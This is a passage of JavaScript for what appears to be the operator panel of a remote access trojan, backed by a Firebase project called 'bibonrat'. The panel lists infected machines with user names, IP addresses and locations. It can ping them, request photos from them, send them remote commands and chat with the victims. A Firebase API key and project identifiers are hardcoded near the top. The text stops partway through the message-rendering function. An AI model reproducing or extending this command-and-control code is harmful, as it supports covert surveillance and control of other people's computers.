// main.js
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.0/firebase-app.js";
import {
    getAuth,
    onAuthStateChanged,
    signInWithEmailAndPassword,
    createUserWithEmailAndPassword,
    signOut
} from "https://www.gstatic.com/firebasejs/10.13.0/firebase-auth.js";

import {
    getFirestore,
    collection,
    addDoc,
    serverTimestamp,
    onSnapshot,
    query,
    orderBy,
    limit,
    doc,
    updateDoc,
    getDocs,
    setDoc,
    deleteDoc,
    getDoc
} from "https://www.gstatic.com/firebasejs/10.13.0/firebase-firestore.js";

// ✅ ТВОЙ firebaseConfig
const firebaseConfig = {
    apiKey: "AIzaSyAQlLh2Abk92sZVCSsYSCxvps4Uld3C1Lk",
    authDomain: "bibonrat.firebaseapp.com",
    databaseURL: "https://bibonrat-default-rtdb.asia-southeast1.firebasedatabase.app",
    projectId: "bibonrat",
    storageBucket: "bibonrat.firebasestorage.app",
    messagingSenderId: "78759159251",
    appId: "1:78759159251:web:3e40d7d5a2aa762f01bb26"
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);

// ==== настройки ====
const MAX_MESSAGES = 6;
const ADMIN_NAME = "Admin";
const PING_TIMEOUT_MS = 8000;

// ---------- UI ----------
const authScreen = document.getElementById("authScreen");
const appScreen = document.getElementById("appScreen");

const emailEl = document.getElementById("email");
const passEl = document.getElementById("password");

const btnLogin = document.getElementById("btnLogin");
const btnRegister = document.getElementById("btnRegister");
const btnLogout = document.getElementById("btnLogout");
const btnRefresh = document.getElementById("btnRefresh");

// Sidebar elements
const sidebar = document.querySelector(".sidebar");
const sidebarToggle = document.getElementById("sidebarToggle");
const mobileMenuBtn = document.getElementById("mobileMenuBtn");

const authError = document.getElementById("authError");
const meEmail = document.getElementById("meEmail");

// Страницы
const pcListSection = document.getElementById("pcListSection");
const pcInfoSection = document.getElementById("pcInfoSection");
const chatSection = document.getElementById("chatSection");
const commandSection = document.getElementById("commandSection");
const foldersSection = document.getElementById("foldersSection");

// Элементы меню
const menuItems = document.querySelectorAll(".menuItem");
const pcCountBadge = document.getElementById("pcCountBadge");
const selectedPcBadge = document.getElementById("selectedPcBadge");
const chatBadge = document.getElementById("chatBadge");
const cmdBadge = document.getElementById("cmdBadge");
const foldersBadge = document.getElementById("foldersBadge");

// PC List Page
const searchEl = document.getElementById("search");
const clientsList = document.getElementById("clientsList");
const btnPingAll = document.getElementById("btnPingAll");
const pingAllStatus = document.getElementById("pingAllStatus");
const totalClients = document.getElementById("totalClients");
const onlineClients = document.getElementById("onlineClients");
const offlineClients = document.getElementById("offlineClients");

// Sort & Filter
const sortDirBtn = document.getElementById("sortDirBtn");
const folderFilterBtns = document.getElementById("folderFilterBtns");

// Multi-select
const btnSelectMode = document.getElementById("btnSelectMode");
const multiSelectBar = document.getElementById("multiSelectBar");
const multiSelectCount = document.getElementById("multiSelectCount");
const btnMoveToFolder = document.getElementById("btnMoveToFolder");
const btnRemoveFromFolder = document.getElementById("btnRemoveFromFolder");
const btnCancelSelect = document.getElementById("btnCancelSelect");

// PC Info Page
const infoContent = document.getElementById("infoContent");
const selectedClientName = document.getElementById("selectedClientName");
const pcOnlineStatus = document.getElementById("pcOnlineStatus");

// Chat Page
const chatStatus = document.getElementById("chatStatus");
const chatHeader = document.getElementById("chatHeader");
const chatBody = document.getElementById("chatBody");
const chatInputBar = document.getElementById("chatInput");

const chatClientName = document.getElementById("chatClientName");
const chatClientMeta = document.getElementById("chatClientMeta");
const chatClientIdPill = document.getElementById("chatClientIdPill");
const badgeOnline = document.getElementById("badgeOnline");

const fAdminOnline = document.getElementById("fAdminOnline");
const fAdminOpen = document.getElementById("fAdminOpen");
const fClientOnline = document.getElementById("fClientOnline");
const fClientOpen = document.getElementById("fClientOpen");

const btnOpenChat = document.getElementById("btnOpenChat");
const btnCloseChat = document.getElementById("btnCloseChat");
const btnGetPhoto = document.getElementById("btnGetPhoto");

const btnPing = document.getElementById("btnPing");
const pingStatus = document.getElementById("pingStatus");

const msgInput = document.getElementById("msgInput");
const btnSend = document.getElementById("btnSend");

// Command Page
const cmdPanel = document.querySelector(".cmdPanel");
const cmdInput = document.getElementById("cmdInput");
const btnCmdSend = document.getElementById("btnCmdSend");
const cmdOutput = document.getElementById("cmdOutput");
const cmdStatusBadge = document.getElementById("cmdStatusBadge");
const cmdClientName = document.getElementById("cmdClientName");
const cmdPreset = document.getElementById("cmdPreset");
const btnCmdClose = document.getElementById("btnCmdClose");

// Folders Page
const btnCreateRootFolder = document.getElementById("btnCreateRootFolder");
const foldersCountBadge = document.getElementById("foldersCountBadge");
const folderTreeRoot = document.getElementById("folderTreeRoot");
const folderClientsTitle = document.getElementById("folderClientsTitle");
const folderClientsCount = document.getElementById("folderClientsCount");
const folderClientsList = document.getElementById("folderClientsList");

// Modal
const moveFolderModal = document.getElementById("moveFolderModal");
const modalClose = document.getElementById("modalClose");
const modalCancel = document.getElementById("modalCancel");
const modalFolderList = document.getElementById("modalFolderList");
const modalMoveToRoot = document.getElementById("modalMoveToRoot");

// ---------- State ----------
let pcDocs = [];
let selectedClientId = null;
let selectedClientData = null;
let currentPage = "pcList";

let unsubscribeClients = null;
let unsubscribeChat = null;
let unsubscribeCmd = null;
let unsubscribeFolders = null;

let chatIsOpen = false;
let trimLock = false;

// Sort state
let sortBy = "date";     // "date" | "name" | "online" | "folder"
let sortDir = "desc";    // "asc" | "desc"

// Folder filter (PC List page)
let activeFolderFilter = "all"; // "all" | "__none__" | folderId

// Multi-select state
let isSelectMode = false;
let multiSelected = new Set(); // set of client IDs

// Drag & drop state
let dragClientId = null;

// Folders state
let folderDocs = [];               // from FoldSort collection
let activeFolderPageId = null;     // folder currently viewed in Folders page
let collapsedFolders = new Set();  // collapsed folder IDs in tree

// ---------- helpers ----------
function setAuthError(msg) { if (authError) authError.textContent = msg || ""; }

function escapeHtml(str) {
    return String(str ?? "")
        .replaceAll("&", "&amp;")
        .replaceAll("<", "&lt;")
        .replaceAll(">", "&gt;")
        .replaceAll('"', "&quot;")
        .replaceAll("'", "&#039;");
}

function humanFirebaseError(err) {
    const code = err?.code || "";
    if (code.includes("auth/invalid-credential")) return "Неверный email или пароль.";
    if (code.includes("auth/user-not-found")) return "Пользователь не найден.";
    if (code.includes("auth/wrong-password")) return "Неверный пароль.";
    if (code.includes("auth/email-already-in-use")) return "Email уже используется.";
    if (code.includes("auth/weak-password")) return "Слабый пароль (минимум 6 символов).";
    if (code.includes("auth/invalid-email")) return "Неверный формат email.";
    return `Ошибка: ${code || err?.message || "неизвестно"}`;
}

function showAuth() {
    authScreen?.classList.remove("hidden");
    appScreen?.classList.add("hidden");
    setAuthError("");
    cleanupChatSubscription();
    cleanupClientsSubscription();
    cleanupCmdSubscription();
    cleanupFoldersSubscription();
    selectedClientId = null;
    selectedClientData = null;
    chatIsOpen = false;
}

function showApp(user) {
    authScreen?.classList.add("hidden");
    appScreen?.classList.remove("hidden");
    if (meEmail) meEmail.textContent = user?.email || "";
    setAuthError("");
    switchPage("pcList");
}

function cleanupChatSubscription() {
    if (unsubscribeChat) { unsubscribeChat(); unsubscribeChat = null; }
}
function cleanupClientsSubscription() {
    if (unsubscribeClients) { unsubscribeClients(); unsubscribeClients = null; }
}
function cleanupCmdSubscription() {
    if (unsubscribeCmd) { unsubscribeCmd(); unsubscribeCmd = null; }
}
function cleanupFoldersSubscription() {
    if (unsubscribeFolders) { unsubscribeFolders(); unsubscribeFolders = null; }
}

function tsToDate(ts) {
    if (!ts) return null;
    if (typeof ts.toDate === "function") return ts.toDate();
    if (typeof ts.seconds === "number") return new Date(ts.seconds * 1000);
    return null;
}

const fmtTime = new Intl.DateTimeFormat("ru-RU", {
    day: "2-digit", month: "2-digit", year: "2-digit",
    hour: "2-digit", minute: "2-digit"
});

function onlineBadge(pcOnline) {
    if (pcOnline === 1) return { text: "ONLINE", cls: "ok" };
    if (pcOnline === 0) return { text: "OFFLINE", cls: "bad" };
    return { text: "UNKNOWN", cls: "warn" };
}

function randToken() {
    return (crypto?.randomUUID ? crypto.randomUUID() : String(Date.now()) + "_" + Math.random().toString(16).slice(2));
}

function nowLocalString() {
    const d = new Date();
    const pad = (n) => String(n).padStart(2, "0");
    return `${pad(d.getDate())}.${pad(d.getMonth() + 1)}.${d.getFullYear()} ${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`;
}

// ---------- PAGE NAVIGATION ----------
function switchPage(pageName) {
    currentPage = pageName;

    [pcListSection, pcInfoSection, chatSection, commandSection, foldersSection].forEach(section => {
        section?.classList.add("hidden");
    });

    const sectionMap = {
        "pcList": pcListSection,
        "pcInfo": pcInfoSection,
        "chat": chatSection,
        "command": commandSection,
        "folders": foldersSection
    };

    if (sectionMap[pageName]) {
        sectionMap[pageName].classList.remove("hidden");
    }

    menuItems.forEach(item => {
        if (item.getAttribute("data-page") === pageName) {
            item.classList.add("active");
        } else {
            item.classList.remove("active");
        }
    });

    updatePageContent();
}

function updatePageContent() {
    switch (currentPage) {
        case "pcInfo":
            renderPcInfo();
            break;
        case "chat":
            renderChatPage();
            break;
        case "command":
            renderCommandPage();
            break;
        case "folders":
            renderFolderPage();
            break;
    }
}

menuItems.forEach(item => {
    item.addEventListener("click", () => {
        const page = item.getAttribute("data-page");
        if (page) {
            switchPage(page);
            // Close mobile menu after selecting
            if (window.innerWidth <= 768 && appScreen?.classList.contains("menu-open")) {
                toggleMobileSidebar();
            }
        }
    });
});

// ---------- AUTH ----------
onAuthStateChanged(auth, (user) => {
    if (user) {
        showApp(user);
        startClientsRealtime();
        startFoldersRealtime();
    } else {
        showAuth();
    }
});

btnLogin?.addEventListener("click", async () => {
    setAuthError("");
    try {
        await signInWithEmailAndPassword(auth, emailEl.value.trim(), passEl.value);
    } catch (e) {
        setAuthError(humanFirebaseError(e));
    }
});

btnRegister?.addEventListener("click", async () => {
    setAuthError("");
    try {
        await createUserWithEmailAndPassword(auth, emailEl.value.trim(), passEl.value);
    } catch (e) {
        setAuthError(humanFirebaseError(e));
    }
});

btnLogout?.addEventListener("click", async () => {
    if (selectedClientId && chatIsOpen) {
        await setAdminFlags(selectedClientId, 0).catch(() => { });
    }
    await signOut(auth);
});

// ---------- PHOTO ----------
btnGetPhoto?.addEventListener("click", async () => {
    if (!selectedClientId) { alert("Выберите клиента!"); return; }
    try {
        const ref = doc(db, "pcList", selectedClientId);
        await updateDoc(ref, {
            photoRequest: 1,
            photoRequestTime: serverTimestamp()
        });
        setPingBadge("Запрос фото отправлен", "good");
        setTimeout(() => setPingBadge("—", ""), 2000);
    } catch (error) {
        setPingBadge("Ошибка запроса", "bad2");
        alert("Ошибка при отправке запроса фото: " + error.message);
    }
});

// ---------- CLIENTS (realtime) ----------
btnRefresh?.addEventListener("click", () => renderClients());
searchEl?.addEventListener("input", renderClients);

function startClientsRealtime() {
    cleanupClientsSubscription();

    if (clientsList) clientsList.innerHTML = `<div class="muted" style="padding:10px;">Загрузка клиентов...</div>`;

    unsubscribeClients = onSnapshot(collection(db, "pcList"), (snap) => {
        const arr = [];
        snap.forEach((d) => arr.push({ id: d.id, ...d.data() }));
        pcDocs = arr;
        renderClients();
        updateStats();
        renderFolderFilterBtns();

        if (selectedClientId) {
            const exists = pcDocs.some(x => x.id === selectedClientId);
            if (!exists) {
                selectClient(null);
            } else {
                selectedClientData = pcDocs.find(x => x.id === selectedClientId);
                updateSelectedClientInfo();
            }
        }

        // refresh folders page if open
        if (currentPage === "folders") renderFolderPage();
    }, (err) => {
        if (clientsList) {
            clientsList.innerHTML = `<div class="err" style="padding:10px;">Ошибка pcList: ${escapeHtml(err?.message || err)}</div>`;
        }
    });
}

function updateStats() {
    const total = pcDocs.length;
    const online = pcDocs.filter(c => c.online?.pcOnline === 1).length;
    const offline = total - online;

    if (totalClients) totalClients.textContent = total;
    if (onlineClients) onlineClients.textContent = online;
    if (offlineClients) offlineClients.textContent = offline;

    if (pcCountBadge) {
        pcCountBadge.textContent = total;
        pcCountBadge.className = online > 0 ? "badge ok" : "badge";
    }
}

function clientSearchKey(c) {
    return [
        c.id,
        c.system?.pcName,
        c.system?.userName,
        c.system?.internetIp,
        c.system?.localIp,
        c.system?.city,
        c.system?.region,
        c.system?.country
    ].filter(Boolean).join(" ").toLowerCase();
}

// ---------- SORT LOGIC ----------
function getSortedClients(arr) {
    const sorted = [...arr];

    sorted.sort((a, b) => {
        let cmp = 0;

        if (sortBy === "date") {
            const at = tsToDate(a.createdAt || a.system?.registeredAt) || new Date(0);
            const bt = tsToDate(b.createdAt || b.system?.registeredAt) || new Date(0);
            // Fallback: compare IDs lexicographically (Firebase IDs are time-ordered)
            cmp = at.getTime() !== bt.getTime()
                ? at.getTime() - bt.getTime()
                : (a.id < b.id ? -1 : a.id > b.id ? 1 : 0);
        } else if (sortBy === "name") {
            const an = (a.system?.pcName || a.id || "").toLowerCase();
            const bn = (b.system?.pcName || b.id || "").toLowerCase();
            cmp = an.localeCompare(bn);
        } else if (sortBy === "online") {
            const ao = a.online?.pcOnline ?? -1;
            const bo = b.online?.pcOnline ?? -1;
            cmp = bo - ao; // online first by default
        } else if (sortBy === "folder") {
            const af = a.folderId ? getFolderName(a.folderId) : "zzz";
            const bf = b.folderId ? getFolderName(b.folderId) : "zzz";
            cmp = af.localeCompare(bf);
        }

        return sortDir === "asc" ? cmp : -cmp;
    });

    return sorted;
}

function getFolderName(folderId) {
    if (!folderId) return "";
    const f = folderDocs.find(x => x.id === folderId);
    return f?.name || folderId;
}

// Sort button handlers
document.querySelectorAll(".sortBtn[data-sort]").forEach(btn => {
    btn.addEventListener("click", () => {
        const s = btn.getAttribute("data-sort");
        if (sortBy === s) {
            sortDir = sortDir === "asc" ? "desc" : "asc";
        } else {
            sortBy = s;
            sortDir = "desc";
        }
        updateSortUI();
        renderClients();
    });
});

sortDirBtn?.addEventListener("click", () => {
    sortDir = sortDir === "asc" ? "desc" : "asc";
    updateSortUI();
    renderClients();
});

function updateSortUI() {
    document.querySelectorAll(".sortBtn[data-sort]").forEach(btn => {
        btn.classList.toggle("active", btn.getAttribute("data-sort") === sortBy);
    });
    if (sortDirBtn) {
        sortDirBtn.innerHTML = sortDir === "asc"
            ? '<i class="fas fa-sort-amount-up"></i>'
            : '<i class="fas fa-sort-amount-down"></i>';
    }
}

// ---------- FOLDER FILTER ----------
function renderFolderFilterBtns() {
    if (!folderFilterBtns) return;

    // Keep fixed buttons, add dynamic ones
    const dynamicBtns = folderDocs.map(f => {
        const clientCount = pcDocs.filter(c => c.folderId === f.id).length;
        return `<button class="sortBtn folderFilterBtn${activeFolderFilter === f.id ? ' active' : ''}" data-folder="${escapeHtml(f.id)}">
            <i class="fas fa-folder"></i> ${escapeHtml(f.name)} <span style="opacity:.6">(${clientCount})</span>
        </button>`;
    }).join("");

    // Reset fixed buttons state
    const allBtn = folderFilterBtns.querySelector('[data-folder="all"]');
    const noneBtn = folderFilterBtns.querySelector('[data-folder="__none__"]');
    if (allBtn) allBtn.classList.toggle("active", activeFolderFilter === "all");
    if (noneBtn) noneBtn.classList.toggle("active", activeFolderFilter === "__none__");

    // Remove old dynamic buttons, add new
    folderFilterBtns.querySelectorAll('.folderFilterBtn[data-folder]:not([data-folder="all"]):not([data-folder="__none__"])').forEach(b => b.remove());
    folderFilterBtns.insertAdjacentHTML("beforeend", dynamicBtns);

    // Bind all folder filter buttons
    folderFilterBtns.querySelectorAll(".folderFilterBtn").forEach(btn => {
        btn.onclick = () => {
            activeFolderFilter = btn.getAttribute("data-folder");
            renderFolderFilterBtns();
            renderClients();
        };
    });
}

// ---------- MULTI-SELECT ----------
btnSelectMode?.addEventListener("click", () => {
    isSelectMode = !isSelectMode;
    multiSelected.clear();
    if (isSelectMode) {
        btnSelectMode.innerHTML = '<i class="fas fa-times"></i> Отмена';
        btnSelectMode.classList.add("btnPrimary");
        multiSelectBar?.classList.remove("hidden");
    } else {
        btnSelectMode.innerHTML = '<i class="fas fa-check-square"></i> Выбрать';
        btnSelectMode.classList.remove("btnPrimary");
        multiSelectBar?.classList.add("hidden");
    }
    updateMultiSelectCount();
    renderClients();
});

btnCancelSelect?.addEventListener("click", () => {
    isSelectMode = false;
    multiSelected.clear();
    btnSelectMode.innerHTML = '<i class="fas fa-check-square"></i> Выбрать';
    btnSelectMode.classList.remove("btnPrimary");
    multiSelectBar?.classList.add("hidden");
    renderClients();
});

function updateMultiSelectCount() {
    if (multiSelectCount) {
        multiSelectCount.textContent = `${multiSelected.size} выбрано`;
    }
}

function toggleClientSelect(id, el) {
    if (multiSelected.has(id)) {
        multiSelected.delete(id);
        el?.classList.remove("selected");
    } else {
        multiSelected.add(id);
        el?.classList.add("selected");
    }
    updateMultiSelectCount();
}

// Remove from folder (bulk)
btnRemoveFromFolder?.addEventListener("click", async () => {
    if (multiSelected.size === 0) { alert("Ничего не выбрано!"); return; }
    try {
        const promises = [...multiSelected].map(id =>
            updateDoc(doc(db, "pcList", id), { folderId: null, folderName: null })
        );
        await Promise.all(promises);
        multiSelected.clear();
        updateMultiSelectCount();
        renderClients();
    } catch (e) {
        alert("Ошибка: " + (e?.message || e));
    }
});

// Move selected to folder button
btnMoveToFolder?.addEventListener("click", () => {
    if (multiSelected.size === 0) { alert("Ничего не выбрано!"); return; }
    openMoveFolderModal([...multiSelected]);
});

// ---------- RENDER CLIENTS ----------
function renderClients() {
    if (!clientsList) return;

    const q = (searchEl?.value || "").trim().toLowerCase();

    let filtered = !q ? pcDocs : pcDocs.filter(c => clientSearchKey(c).includes(q));

    // Apply folder filter
    if (activeFolderFilter === "__none__") {
        filtered = filtered.filter(c => !c.folderId);
    } else if (activeFolderFilter !== "all") {
        filtered = filtered.filter(c => c.folderId === activeFolderFilter);
    }

    const sorted = getSortedClients(filtered);

    if (sorted.length === 0) {
        clientsList.innerHTML = `<div class="muted" style="padding:10px;">Ничего не найдено.</div>`;
        return;
    }

    clientsList.innerHTML = sorted.map((c) => {
        const pcName = c.system?.pcName || c.id;
        const user = c.system?.userName ? `@${c.system.userName}` : "—";
        const region = c.system?.region || c.system?.city || "—";
        const ip = c.system?.internetIp || c.system?.localIp || "—";
        const badge = onlineBadge(c.online?.pcOnline);
        const folderBadge = c.folderId
            ? `<span class="folderTag"><i class="fas fa-folder"></i> ${escapeHtml(getFolderName(c.folderName))}</span>`
            : "";
        const isChecked = multiSelected.has(c.id) ? "selected" : "";
        const isActive = c.id === selectedClientId && !isSelectMode ? "active" : "";

        return `
      <div class="clientItem ${isActive} ${isChecked}" 
           data-id="${escapeHtml(c.id)}"
           draggable="true">
        <div class="clientTop">
          ${isSelectMode ? `<div class="clientCheckbox ${multiSelected.has(c.id) ? 'checked' : ''}" data-id="${escapeHtml(c.id)}"><i class="fas ${multiSelected.has(c.id) ? 'fa-check-square' : 'fa-square'}"></i></div>` : ''}
          <div class="clientName">${escapeHtml(pcName)}</div>
          <div class="clientTopRight">
            ${folderBadge}
            <span class="badge ${badge.cls}">${badge.text}</span>
            ${!isSelectMode ? `<button class="clientMoveBtn" data-id="${escapeHtml(c.id)}" title="Переместить в папку"><i class="fas fa-folder-arrow-up"></i></button>` : ''}
          </div>
        </div>
        <div class="clientMeta">
          <div><b>${escapeHtml(user)}</b> • ${escapeHtml(region)} • ${escapeHtml(c.system?.country || "—")}</div>
          <div>IP: ${escapeHtml(ip)}</div>
        </div>
      </div>
    `;
    }).join("");

    // Bind events
    clientsList.querySelectorAll(".clientItem").forEach((el) => {
        const id = el.getAttribute("data-id");

        // Click: select or open
        el.addEventListener("click", (e) => {
            if (e.target.closest(".clientMoveBtn")) return; // handled separately
            if (isSelectMode) {
                toggleClientSelect(id, el);
            } else {
                selectClient(id);
            }
        });

        // Drag & drop
        el.addEventListener("dragstart", (e) => {
            dragClientId = id;
            el.classList.add("dragging");
            e.dataTransfer.effectAllowed = "move";
            e.dataTransfer.setData("text/plain", id);
        });
        el.addEventListener("dragend", () => {
            el.classList.remove("dragging");
            dragClientId = null;
        });
    });

    // Move button handler
    clientsList.querySelectorAll(".clientMoveBtn").forEach((btn) => {
        btn.addEventListener("click", (e) => {
            e.stopPropagation();
            const id = btn.getAttribute("data-id");
            openMoveFolderModal([id]);
        });
    });

    // Checkbox handler
    clientsList.querySelectorAll(".clientCheckbox").forEach((el) => {
        el.addEventListener("click", (e) => {
            e.stopPropagation();
            const id = el.getAttribute("data-id");
            const parentItem = el.closest(".clientItem");
            toggleClientSelect(id, parentItem);
        });
    });
}

// ---------- SELECT CLIENT ----------
function selectClient(id) {
    if (selectedClientId && chatIsOpen && selectedClientId !== id) {
        setAdminFlags(selectedClientId, 0).catch(() => { });
    }

    selectedClientId = id;
    selectedClientData = id ? pcDocs.find(x => x.id === id) : null;

    chatIsOpen = false;
    cleanupChatSubscription();
    cleanupCmdSubscription();

    renderClients();
    updateSelectedClientInfo();

    if (selectedPcBadge) {
        if (id) { selectedPcBadge.textContent = "✓"; selectedPcBadge.className = "badge ok"; }
        else { selectedPcBadge.textContent = "—"; selectedPcBadge.className = "badge"; }
    }

    if (chatBadge) { chatBadge.textContent = "OFF"; chatBadge.className = "badge"; }
    if (cmdBadge) { cmdBadge.textContent = "—"; cmdBadge.className = "badge"; }

    setPingBadge("—", "");
    setPingAllBadge("—", "");

    updatePageContent();
}

function updateSelectedClientInfo() {
    if (!selectedClientId || !selectedClientData) {
        if (selectedClientName) selectedClientName.textContent = "Не выбран";
        if (pcOnlineStatus) pcOnlineStatus.textContent = "—";
        return;
    }

    const pcName = selectedClientData?.system?.pcName || selectedClientId;
    const badge = onlineBadge(selectedClientData?.online?.pcOnline);

    if (selectedClientName) selectedClientName.textContent = pcName;
    if (pcOnlineStatus) {
        pcOnlineStatus.textContent = badge.text;
        pcOnlineStatus.className = `badge ${badge.cls}`;
    }
}

// ---------- PC INFO PAGE ----------
function renderPcInfo() {
    if (!infoContent) return;

    if (!selectedClientId || !selectedClientData) {
        infoContent.innerHTML = `<div class="hint">Выберите клиента на странице "PC List" для просмотра информации</div>`;
        return;
    }

    const client = selectedClientData;
    const sys = client.system || {};
    const online = client.online || {};

    const infoCards = [];

    infoCards.push(`
        <div class="infoCard">
            <div class="infoCardTitle">Основная информация</div>
            <div class="infoRow"><span class="infoLabel">ID документа:</span><span class="infoValue">${escapeHtml(client.id)}</span></div>
            <div class="infoRow"><span class="infoLabel">Имя ПК:</span><span class="infoValue">${escapeHtml(sys.pcName || "—")}</span></div>
            <div class="infoRow"><span class="infoLabel">Пользователь:</span><span class="infoValue">${escapeHtml(sys.userName || "—")}</span></div>
            <div class="infoRow"><span class="infoLabel">Статус:</span><span class="infoValue">${onlineBadge(online.pcOnline).text}</span></div>
            <div class="infoRow"><span class="infoLabel">Папка:</span><span class="infoValue">${client.folderId ? escapeHtml(getFolderName(client.folderId)) : "—"}</span></div>
        </div>
    `);

    infoCards.push(`
        <div class="infoCard">
            <div class="infoCardTitle">Сетевая информация</div>
            <div class="infoRow"><span class="infoLabel">Внешний IP:</span><span class="infoValue">${escapeHtml(sys.internetIp || "—")}</span></div>
            <div class="infoRow"><span class="infoLabel">Локальный IP:</span><span class="infoValue">${escapeHtml(sys.localIp || "—")}</span></div>
        </div>
    `);

    infoCards.push(`
        <div class="infoCard">
            <div class="infoCardTitle">Геолокация</div>
            <div class="infoRow"><span class="infoLabel">Страна:</span><span class="infoValue">${escapeHtml(sys.country || "—")}</span></div>
            <div class="infoRow"><span class="infoLabel">Регион:</span><span class="infoValue">${escapeHtml(sys.region || "—")}</span></div>
            <div class="infoRow"><span class="infoLabel">Город:</span><span class="infoValue">${escapeHtml(sys.city || "—")}</span></div>
        </div>
    `);

    infoCards.push(`
        <div class="infoCard">
            <div class="infoCardTitle">Система</div>
            <div class="infoRow"><span class="infoLabel">ОС:</span><span class="infoValue">${escapeHtml(sys.osVersion || "—")}</span></div>
            <div class="infoRow"><span class="infoLabel">Архитектура:</span><span class="infoValue">${escapeHtml(sys.architecture || "—")}</span></div>
            <div class="infoRow"><span class="infoLabel">Время работы:</span><span class="infoValue">${escapeHtml(online.startTime || "—")}</span></div>
        </div>
    `);

    infoCards.push(`
        <div class="infoCard">
            <div class="infoCardTitle">Флаги состояния</div>
            <div class="infoRow"><span class="infoLabel">adminOnline:</span><span class="infoValue">${client.adminOnline || 0}</span></div>
            <div class="infoRow"><span class="infoLabel">adminOpen:</span><span class="infoValue">${client.adminOpen || 0}</span></div>
            <div class="infoRow"><span class="infoLabel">clientOnline:</span><span class="infoValue">${client.clientOnline || 0}</span></div>
            <div class="infoRow"><span class="infoLabel">clientOpen:</span><span class="infoValue">${client.clientOpen || 0}</span></div>
        </div>
    `);

    infoContent.innerHTML = `<div class="infoGrid">${infoCards.join("")}</div>`;
}

// ---------- CHAT PAGE ----------
function renderChatPage() {
    if (!selectedClientId) {
        chatHeader?.classList.add("hidden");
        chatInputBar?.classList.add("hidden");
        if (chatBody) chatBody.innerHTML = `<div class="hint">Выберите клиента на странице "PC List" для начала чата</div>`;
        if (chatStatus) chatStatus.textContent = "не выбран клиент";
        return;
    }
    renderChatHeader();
    if (!chatIsOpen) {
        chatInputBar?.classList.add("hidden");
        if (chatBody) chatBody.innerHTML = `<div class="hint">Нажмите <b>Открыть чат</b> для загрузки сообщений</div>`;
        if (chatStatus) chatStatus.textContent = "чат закрыт";
    } else {
        chatInputBar?.classList.remove("hidden");
        if (chatStatus) chatStatus.textContent = "чат открыт";
    }
}

function renderChatHeader() {
    if (!selectedClientId || !selectedClientData) return;

    const client = selectedClientData;
    const pcName = client?.system?.pcName || selectedClientId;
    const badge = onlineBadge(client?.online?.pcOnline);

    if (chatClientName) chatClientName.textContent = pcName;
    if (badgeOnline) {
        badgeOnline.textContent = badge.text;
        badgeOnline.className = `badge ${badge.cls}`;
    }
    if (chatClientIdPill) chatClientIdPill.textContent = `pcList/${selectedClientId}`;

    const sys = client?.system || {};
    const pills = [];
    if (sys.userName) pills.push(`<span class="pill">@${escapeHtml(sys.userName)}</span>`);
    if (sys.region) pills.push(`<span class="pill">${escapeHtml(sys.region)}</span>`);
    if (sys.city) pills.push(`<span class="pill">${escapeHtml(sys.city)}</span>`);
    if (sys.internetIp) pills.push(`<span class="pill">IP: ${escapeHtml(sys.internetIp)}</span>`);

    const isMobile = window.innerWidth <= 768;
    if (isMobile && pills.length > 2) { pills.length = 2; pills.push('<span class="pill">...</span>'); }

    if (chatClientMeta) chatClientMeta.innerHTML = pills.join(" ");

    if (fAdminOnline) fAdminOnline.textContent = String(client?.adminOnline ?? 0);
    if (fAdminOpen) fAdminOpen.textContent = String(client?.adminOpen ?? 0);
    if (fClientOnline) fClientOnline.textContent = String(client?.clientOnline ?? 0);
    if (fClientOpen) fClientOpen.textContent = String(client?.clientOpen ?? 0);

    chatHeader?.classList.remove("hidden");
}

async function setAdminFlags(clientId, value01) {
    const ref = doc(db, "pcList", clientId);
    await updateDoc(ref, { adminOpen: value01, adminOnline: value01 });
}

function startChatRealtime(clientId) {
    const chatRef = collection(db, "pcList", clientId, "chatMessages");
    const q = query(chatRef, orderBy("ts", "desc"), limit(MAX_MESSAGES));

    unsubscribeChat = onSnapshot(q, (snap) => {
        const stickToBottom = isNearBottom(chatBody);
        const msgs = [];
        snap.forEach((d) => msgs.push({ id: d.id, ...d.data() }));
        msgs.reverse();
        renderMessages(msgs);
        if (stickToBottom) scrollToBottom(chatBody);
    }, (err) => {
        if (chatBody) chatBody.innerHTML = `<div class="err">Ошибка чтения чата: ${escapeHtml(err?.message || err)}</div>`;
    });
}

btnOpenChat?.addEventListener("click", async () => {
    if (!selectedClientId) return;
    if (chatStatus) chatStatus.textContent = "открываем чат…";
    try {
        await setAdminFlags(selectedClientId, 1);
        chatIsOpen = true;
        chatInputBar?.classList.remove("hidden");
        if (chatBody) chatBody.innerHTML = `<div class="muted">Загрузка сообщений…</div>`;
        cleanupChatSubscription();
        startChatRealtime(selectedClientId);
        if (chatStatus) chatStatus.textContent = "чат открыт";
        msgInput?.focus();
        if (chatBadge) { chatBadge.textContent = "ON"; chatBadge.className = "badge ok"; }
    } catch (e) {
        if (chatStatus) chatStatus.textContent = "ошибка";
        alert("Не удалось открыть чат: " + (e?.message || e));
    }
});

btnCloseChat?.addEventListener("click", async () => {
    if (!selectedClientId) return;
    if (chatStatus) chatStatus.textContent = "закрываем чат…";
    try {
        await setAdminFlags(selectedClientId, 0);
        chatIsOpen = false;
        cleanupChatSubscription();
        chatInputBar?.classList.add("hidden");
        if (chatBody) chatBody.innerHTML = `<div class="hint">Чат закрыт. Нажмите <b>Открыть чат</b> для продолжения.</div>`;
        if (chatStatus) chatStatus.textContent = "чат закрыт";
        if (chatBadge) { chatBadge.textContent = "OFF"; chatBadge.className = "badge"; }
    } catch (e) {
        if (chatStatus) chatStatus.textContent = "ошибка";
        alert("Не удалось закрыть чат: " + (e?.message || e));
    }
});

// ---------- MESSAGES ----------
function isNearBottom(el) {
    if (!el) return true;
    return (el.scrollHeight - el.scrollTop - el.clientHeight) < 80;
}
function scrollToBottom(el) {
    if (!el) return;
    el.scrollTop = el.scrollHeight;
}

function messageSide(msg) {
    if (msg.senderRole === "admin") return "me";
    if (msg.senderRole === "client") return "peer";
    const s = String(msg.sender || "").trim().toLowerCase();
    if (s === ADMIN_NAME.toLowerCase()) return "me";
    return "peer";
}

function renderMessages(msgs) {
    if (!chatBody) return;
    if (!msgs || msgs.length === 0) {
        chatBody.innerHTML = `<div class="hint">Сообщений пока нет. Напишите первое сообщение.</div>`;
        return;
    }
    chatBody.innerHTML = msgs.map((m) => {
        const sender = m.sender || "Unknown";
        const isMe = messageSide(m) === "me";
        const dt = tsToDate(m.ts);
        const time = dt ? fmtTime.format(dt) : "…";
        return `
